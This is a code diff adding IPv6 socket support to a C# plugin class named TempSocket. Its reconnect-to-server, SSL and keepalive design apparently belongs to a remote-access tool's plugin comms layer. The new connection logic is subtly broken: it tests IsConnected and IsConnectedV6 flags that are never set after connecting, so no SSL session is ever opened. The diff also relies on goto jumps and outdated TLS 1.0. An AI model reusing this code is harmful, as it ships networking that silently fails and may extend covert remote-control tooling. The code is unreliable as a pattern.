@@ -16,18 +16,20 @@ namespace Plugin
     public class TempSocket
     {
         public Socket TcpClient { get; set; }
+        public Socket TcpClientV6 { get; set; }
         public SslStream SslClient { get; set; }
         private byte[] Buffer { get; set; }
         private static long HeaderSize { get; set; }
         private static long Offset { get; set; }
         public bool IsConnected { get; set; }
+        public bool IsConnectedV6 { get; set; }
         private object SendSync { get; } = new object();
         private static Timer Tick { get; set; }
 
 
         public TempSocket()
         {
-            if (!Connection.IsConnected) return;
+            if (!Connection.IsConnected && !Connection.IsConnectedV6) return;
 
             try
             {
@@ -36,24 +38,74 @@ namespace Plugin
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
                 };
+                TcpClientV6 = new System.Net.Sockets.Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp)
+                {
+                    ReceiveBufferSize = 50 * 1024,
+                    SendBufferSize = 50 * 1024,
+                };
 
-                TcpClient.Connect(Connection.TcpClient.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(Connection.TcpClient.RemoteEndPoint.ToString().Split(':')[1]));
+                IPEndPoint remoteEndPoint = (IPEndPoint)Plugin.Socket.RemoteEndPoint;
 
-                Debug.WriteLine("Temp Connected!");
-                IsConnected = true;
-                SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
-                SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
-                HeaderSize = 4;
-                Buffer = new byte[HeaderSize];
-                Offset = 0;
-                Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
-                SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
+                if (IPAddress.TryParse(remoteEndPoint.Address.ToString(), out IPAddress i4or6))
+                {
+                    switch (i4or6.AddressFamily)
+                    {
+                        case System.Net.Sockets.AddressFamily.InterNetwork:
+                            TcpClient.Connect(remoteEndPoint.Address.ToString(), remoteEndPoint.Port);
+                            if (TcpClient.Connected)
+                            {
+                                //Debug.WriteLine("plugins ipv4 connected");
+                            }
+                            break;
+                        case System.Net.Sockets.AddressFamily.InterNetworkV6:
+                            TcpClientV6.Connect(remoteEndPoint.Address.ToString(), remoteEndPoint.Port);
+                            if (TcpClientV6.Connected)
+                            {
+                                //Debug.WriteLine("plugins ipv6 connected");
+                            }
+                            break;
+                    }
+                }
+                if (IsConnected) 
+                {
+                    Debug.WriteLine("Temp Connected!");
+                    IsConnected = true;
+                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
+                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+                    HeaderSize = 4;
+                    Buffer = new byte[HeaderSize];
+                    Offset = 0;
+                    Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
+                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
+                }
+                else 
+                {
+                    IsConnected = false;
+                    if (IsConnectedV6)
+                    {
+                        Debug.WriteLine("Temp Connected!");
+                        IsConnectedV6 = true;
+                        SslClient = new SslStream(new NetworkStream(TcpClientV6, true), false, ValidateServerCertificate);
+                        SslClient.AuthenticateAsClient(TcpClientV6.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+                        HeaderSize = 4;
+                        Buffer = new byte[HeaderSize];
+                        Offset = 0;
+                        Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
+                        SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
+                    }
+                    else
+                    {
+                        IsConnectedV6 = false;
+                        return;
+                    }
+                }
             }
             catch
             {
                 Debug.WriteLine("Temp Disconnected!");
                 Dispose();
                 IsConnected = false;
+                IsConnectedV6 = false;
             }
         }
 
@@ -72,6 +124,7 @@ namespace Plugin
             try
             {
                 TcpClient.Shutdown(SocketShutdown.Both);
+                TcpClientV6.Shutdown(SocketShutdown.Both);
             }
             catch { }
 
@@ -80,6 +133,7 @@ namespace Plugin
                 Tick?.Dispose();
                 SslClient?.Dispose();
                 TcpClient?.Dispose();
+                TcpClientV6?.Dispose();
             }
             catch { }
         }
@@ -91,8 +145,17 @@ namespace Plugin
                 if (!TcpClient.Connected || !IsConnected)
                 {
                     IsConnected = false;
-                    return;
+                    if (!TcpClientV6.Connected || !IsConnectedV6)
+                    {
+                        IsConnectedV6 = false;
+                        return;
+                    }
+                    else
+                    {
+                        goto accessed;
+                    }
                 }
+            accessed:
                 int recevied = SslClient.EndRead(ar);
                 if (recevied > 0)
                 {
@@ -112,6 +175,7 @@ namespace Plugin
                                 if (rc <= 0)
                                 {
                                     IsConnected = false;
+                                    IsConnectedV6 = false;
                                     return;
                                 }
                                 Offset += rc;
@@ -119,6 +183,7 @@ namespace Plugin
                                 if (HeaderSize < 0)
                                 {
                                     IsConnected = false;
+                                    IsConnectedV6 = false;
                                     return;
                                 }
                             }
@@ -138,6 +203,7 @@ namespace Plugin
                     else if (HeaderSize < 0)
                     {
                         IsConnected = false;
+                        IsConnectedV6 = false;
                         return;
                     }
                     SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
@@ -145,12 +211,14 @@ namespace Plugin
                 else
                 {
                     IsConnected = false;
+                    IsConnectedV6 = false;
                     return;
                 }
             }
             catch
             {
                 IsConnected = false;
+                IsConnectedV6 = false;
                 return;
             }
         }
@@ -163,11 +231,33 @@ namespace Plugin
                 {
                     if (!IsConnected || !Connection.IsConnected)
                     {
-                        Dispose();
-                        return;
+                        if (!IsConnectedV6)
+                        {
+                            return;
+                        }
+                        else
+                        {
+                            if (!Connection.IsConnectedV6)
+                            {
+                                return;
+                            }
+                            else
+                            {
+                                goto next1;
+                            }
+
+                        }
                     }
+                next1:
                     byte[] buffersize = BitConverter.GetBytes(msg.Length);
-                    TcpClient.Poll(-1, SelectMode.SelectWrite);
+                    if (IsConnected)
+                    {
+                        TcpClient.Poll(-1, SelectMode.SelectWrite);
+                    }
+                    else
+                    {
+                        TcpClientV6.Poll(-1, SelectMode.SelectWrite);
+                    }
                     SslClient.Write(buffersize, 0, buffersize.Length);
 
                     if (msg.Length > 1000000) //1mb
@@ -180,7 +270,14 @@ namespace Plugin
                             byte[] chunk = new byte[50 * 1000];
                             while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                             {
-                                TcpClient.Poll(-1, SelectMode.SelectWrite);
+                                if (IsConnected)
+                                {
+                                    TcpClient.Poll(-1, SelectMode.SelectWrite);
+                                }
+                                else
+                                {
+                                    TcpClientV6.Poll(-1, SelectMode.SelectWrite);
+                                }
                                 SslClient.Write(chunk, 0, read);
                             }
                         }
@@ -194,6 +291,7 @@ namespace Plugin
                 catch
                 {
                     IsConnected = false;
+                    IsConnectedV6 = false;
                     Dispose();
                     return;
                 }
